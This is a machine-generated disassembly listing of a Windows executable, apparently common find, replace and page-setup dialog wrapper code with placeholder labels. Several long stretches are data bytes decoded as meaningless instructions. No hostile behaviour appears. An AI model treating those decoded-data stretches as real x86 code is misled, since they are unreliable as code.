pop ebx
retn
push eax
call GlobalFree
sub_433a34
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov ebx eax
lea esi [ ebp - 0x55 ]
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_433a68
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_42f1b0
call sub_42ed10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
xor ecx ecx
mov edx 0x54
call sub_402bf8
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
mov al [ ebx + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ ebx + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ ebx + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ ebx + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ ebx + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
test [ ebx + 0x58 ] 0x10
je r-xdata
add [ esi + 0x10 ] 0x80000
test [ ebx + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
lea ecx [ ebp - 0x60 ]
mov edx [ ebx + 0x80 ]
mov eax [ ebx + 0x7c ]
call sub_417744
mov eax [ ebp - 0x60 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x5c ]
mov [ esi + 0x18 ] eax
mov eax [ ebx + 0x68 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x64 ]
mov edx [ ebx + 0x60 ]
mov eax [ ebx + 0x5c ]
call sub_41776c
push esi
lea edi [ esi + 0x1c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x78 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x74 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x6c ]
call sub_41776c
push esi
lea edi [ esi + 0x2c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x44 ] sub_431ddc
or [ esi + 0x10 ] 0x400
push esi
call PageSetupDlgA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add [ esi + 0x10 ] 0x20
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov [ ebx + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ ebx + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ ebx + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ ebx + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ ebx + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ ebx + 0x78 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
push eax
call GlobalFree
sub_433ca4
xor al 0xbd
inc ebp
add [ edx + eax * 8 + 0x45 ] dl
add [ ebx + eax * 4 - 0x75b7ffbb ] dh
inc ebp
add al ch
xchg edi eax
inc ebp
add [ eax ] dh
cmp eax 0x94d00043
inc ebp
add [ eax ] al
xchg ebx eax
inc ebp
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ ecx ] al
add [ ecx ] ah
mov al 0x90
cmp eax 0x54110043
push edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
or [ 0x11070043 ] bh
push esp
push edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0x3c20776f
inc ebx
add [ ebx + ebx + 0xb0045 ] cl
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_4591d4
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
sub_433d54
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_459d5c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_433d98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_433dd4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_476bf8
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_433d98
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_476c1c
jmp r-xdata
push ebp
call sub_433d98
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_476bf8
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_476bf8
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_476c1c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_476c1c
jmp r-xdata
sub_433e88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_431ddc
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_434148
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_4341b0
push eax
mov eax esi
call sub_434148
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_4341b0
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_433dd4
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_433f10
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_431e44
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_433e88
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_433fba
add [ eax ] al
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40d538
mov edx ebx
and dl 0xfc
mov eax esi
call sub_431e8c
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_434010
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_4528d8
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_43404c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_433e88
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_458074
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_434010
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_45c380
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_434160
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_4341c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_431ec0
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_4033e8
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_4033e8
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_45c380
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_4342c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40443c
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_4089f8
pop esi
pop ebx
retn
sub_4342e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40443c
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_4089f8
pop esi
pop ebx
retn
sub_434308
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433f10
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4343ec
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408ff0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_434487
add [ edi ] cl
add [ eax ] al
add [ eax + 0x9 ] ah
dec eax
add ah ah
mov [ eax ] ecx
add [ eax ] al
add [ eax ] al
pop esp
or [ eax ] ecx
dec esp
mov [ eax ] cs
add [ eax ] al
add [ eax ] al
pop eax
or [ eax ] ecx
test al 0x89
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + ecx + 0x48 ] dl
add [ eax + 0x488d ] al
add [ eax ] al
add [ eax + 0x9 ] dl
dec eax
add [ eax - 0x74 ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + ecx + 0x48 ] cl
add ah bh
mov ecx [ eax ]
add [ eax ] al
add [ eax ] al
dec eax
or [ eax ] ecx
add [ ebp + 0x48 ] cl
add [ eax ] al
inc esp
or [ eax ] ecx
cmp al 0x8b
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x9 ] al
dec eax
add [ esp + ecx * 4 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + ecx ] bh
dec eax
add [ eax - 0x75 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] bh
or [ eax ] ecx
or al 0x8e
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + ecx ] al
dec eax
add [ edx + ecx * 4 ] dh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] ecx
pop eax
lea ecx [ eax ]
add [ eax ] al
add [ eax ] al
cld
or [ eax ] cl
mov al 0x8d
dec eax
add [ eax ] al
add [ eax ] al
add al bh
or [ eax ] cl
lodsb [ esi ]
mov ecx [ eax ]
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434592
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434599
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404a04
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_43459c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d50
call sub_4343ec
mov eax [ r-xdata ]
call sub_4183f8
mov eax [ r-xdata ]
call sub_418498
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
sub_4345dc
sub [ esi + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
inc esi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x39ffbcba ] bh
inc esi
inc ebx
add [ eax - 0x4bffffff ] al
sbb eax [ ebp ]
pop esp
sbb al [ edx ]
inc eax
xor al 0x40
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ eax + 0x6e ] ah
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah al
pop eax
inc ebx
add [ eax + 0x7b ] al
inc ebp
add [ eax ] bh
outsd
inc ebp
add al bl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ eax + 0x3400454e ] cl
pop eax
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax + ebx * 2 ] ch
inc ebx
add al dl
imul eax [ ebp ] sub_435d98
pushfd
push 0x45
add [ eax - 0x2bffbab3 ] dl
push esp
inc ebp
add [ eax ] bh
push esp
inc ebp
add [ eax + 0x5d ] ah
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
add [ ebx + eax * 2 ] bl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
je r-xdata
dec ecx
insd
popad
lea eax [ bx + si ]
aam 0x46
inc ebx
add [ edi ] al
push es
push esp
dec ecx
insd
popad
sub [ gs : bp + 0x43 ] al
add [ eax + 0x2a00451c ] ch
add [ eax ] cl
inc ebp
js r-xdata
inc ebx
add [ esi ] al
push esp
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add ah cl
insb
inc ebp
add [ eax + 0x2000457d ] cl
pop edi
inc ebp
add [ edi + ebx * 2 + 0x50080045 ] dl
inc ebp
add [ edi + ebx * 2 + 0x45 ] dh
add [ edx + ebx * 2 ] bh
inc ebx
add [ edx ] al
add bh dl
inc edi
push esp
pop eax
inc ebx
add [ ebx + ebx * 2 + 0x54060043 ] dl
add [ edi * 2 + 0x581c0045 ] al
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
push cs
add [ esi ] al
inc ebx
outsb
je r-xdata
pop esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insb
jae r-xdata
add [ eax + eax ] dl
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
or [ ebp ] al
je r-xdata
outsb
or al 0x8
inc ebp
add [ ecx ] ah
add bh bh
mov al [ 0x3c00454d ]
dec esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
add al bl
add [ ebp ] al
pop ebx
add [ eax ] al
jmp [ eax + 0x4f ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ecx ] cl
push eax
insb
inc esp
imul esi [ ebx + 0x70 ] 0x79616c
adc [ eax ] al
0xc0ff0000 0x455b
add [ ecx ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
add bh bh
and [ edi + 0x45 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
jpo r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] bl
add [ eax + edx * 2 ] cl
outsb
je r-xdata
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
jns r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
inc [ eax + 0x5c ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
add bh bh
inc eax
pop esp
add [ eax ] dl
inc eax
add [ eax + 0x1 ] bh
outsb
jne r-xdata
popad
jb r-xdata
jo r-xdata
jb r-xdata
add bh bh
pop eax
pop esp
push 0x6948776f
outsb
je r-xdata
add [ ebx ] dl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ edx + 0x1 ] bh
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
inc [ eax ]
add bh bh
add [ eax ] al
add [ edx ] dl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x4500c073
add [ edx ] bh
add bh bh
jpe r-xdata
jne r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ esi ] cl
je r-xdata
adc [ eax ] al
jge r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
jb r-xdata
jo r-xdata
adc [ edi ] 0x0
or [ eax + 0x6f ] edx
outsd
xor eax 0x1680042
add bh bh
sbb [ ebx + eax * 2 ] bl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ edi ] al
push eax
imul esp [ ebx + 0x74 ] 0x20657275
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090017 ] al
adc cl [ ecx + 0x6e ]
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500e00
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
or al 0x45
add [ eax ] al
add [ eax + 0x4f0a0021 ] al
outsb
inc esp
jb r-xdata
js r-xdata
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
push r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or al 0x50
[ eax + 0x5c ]
adc [ eax ] al
push edi
add [ eax ] al
[ ecx + ebx * 2 + 0x45 ]
imul ebp [ edi + 0x6e ] 0x10006c61
inc eax
add [ ecx - 0x63010000 ] bl
pop ebx
inc ebp
add [ ebx + ebx * 2 + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
push 0x6948776f
outsb
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax + 0x4f090026 ] al
jo r-xdata
add [ eax ] al
dec edi
jbe r-xdata
add [ eax ] cl
add al 0xc
inc ebp
push eax
outsd
jo r-xdata
adc [ eax ] al
js r-xdata
add bh bh
jpe r-xdata
lea eax [ bx + si ]
lodsb [ esi ]
dec ebx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
dec ebx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
jo r-xdata
add [ eax + 0x4f0b0024 ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
add al dl
add [ eax ] al
call eax
add [ eax ] al
jae r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090022 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090023 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
jo r-xdata
[ eax ]
add bh bh
sub [ ebx + eax * 2 ] bl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
pop es
push ebx
je r-xdata
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
xor al [ edx ]
jo r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
or eax 0x1000045
call 0xffffffffd8438fb0
add [ eax ] al
dec edi
outsb
inc ebx
outsd
push cs
pop edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x20 ] ah
inc ebp
add [ esi + ecx * 8 + 0x45 ] dl
add [ eax - 0x27ffba6a ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
dec ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0x4db80043 ] cl
inc ebx
add [ edx + eax ] ah
add [ eax ] al
aam 0x1c
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
insb
jae r-xdata
inc edx
add [ eax ] cl
cmp al 0x17
jb r-xdata
push [ eax + 0x1 ]
add bh bh
jo r-xdata
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
jb r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add ah dl
pop edi
inc ebx
add [ eax - 0x37 ] ch
inc ebp
add [ eax ] ch
inc bx
add al dl
int 0x45
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
inc ebp
add al bl
popad
insb
je r-xdata
inc eax
add [ eax ] al
add bh bh
mov [ edi + 0x43 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add bh bh
cwde
pop edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
dec [ eax + 0x100435f ]
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax ] al
pop esi
inc ebx
add [ ecx ] al
add bh ch
inc eax
pop edi
inc ebx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x4bf09072
inc ebx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x434bac72
add [ eax + 0x75 ] ch
inc ecx
add [ 0x78450800 ] al
je r-xdata
pop ss
inc edx
inc esp
jb r-xdata
add ah bl
dec ebx
inc ebx
jb r-xdata
outsb
